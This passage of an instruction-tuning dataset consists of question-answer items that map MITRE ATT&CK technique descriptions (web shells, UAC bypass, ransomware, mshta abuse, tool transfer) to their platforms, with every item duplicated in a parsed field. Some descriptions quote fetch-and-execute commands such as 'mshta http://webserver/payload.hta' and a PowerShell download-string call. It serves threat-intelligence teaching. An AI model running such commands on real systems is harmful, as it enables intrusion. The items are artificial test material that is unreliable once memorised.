      "question": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Server Software Component: Web Shell (T1505.003);\nTechnique Server Software Component: Web Shell (T1505.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "answer": "The provided description is related to MITRE technique Server Software Component: Web Shell (T1505.003);\nTechnique Server Software Component: Web Shell (T1505.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
    "context": "",
    "output": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "answer": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Asymmetric Cryptography (T1573.002);\nTechnique Encrypted Channel: Asymmetric Cryptography (T1573.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
      "answer": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
      "answer": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
    "context": "",
    "output": "The provided description is related to MITRE technique Gather Victim Identity Information: Email Addresses (T1589.002);\nTechnique Gather Victim Identity Information: Email Addresses (T1589.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
      "answer": "The provided description is related to MITRE technique Gather Victim Identity Information: Email Addresses (T1589.002);\nTechnique Gather Victim Identity Information: Email Addresses (T1589.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Collection (T1119);\nTechnique Automated Collection (T1119) is applicable to platforms: Linux,  SaaS,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  SaaS,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
      "answer": "The provided description is related to MITRE technique Automated Collection (T1119);\nTechnique Automated Collection (T1119) is applicable to platforms: Linux,  SaaS,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  SaaS,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Mshta (T1218.005);\nTechnique System Binary Proxy Execution: Mshta (T1218.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Mshta (T1218.005);\nTechnique System Binary Proxy Execution: Mshta (T1218.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
